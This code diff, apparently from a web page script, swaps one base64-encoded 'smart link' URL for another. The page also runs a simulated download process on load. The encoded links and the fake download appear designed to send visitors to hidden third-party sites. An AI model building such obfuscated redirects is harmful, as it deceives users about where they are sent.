@@ -3,7 +3,7 @@
 
 // Smart Link Configuration (BASE64 encoded URLs)
 const ENCODED_LINKS = [
-  'aHR0cHM6Ly9ldmVybW9uLnBhZ2VzLmRldi8=',
+  'aHR0cHM6Ly9kZWVycnJmLnBhZ2VzLmRldi8=',
   'aHR0cHM6Ly9nYW1ldG9saWZlc2VydmVycy5jb20=',
   'aHR0cHM6Ly90ZWNoZmxvd3RpbWUuY29t'
 ];
@@ -460,4 +460,5 @@ document.addEventListener('DOMContentLoaded', () => {
   setTimeout(() => {
     simulateDownloadProcess();
   }, 1000);
+
 });
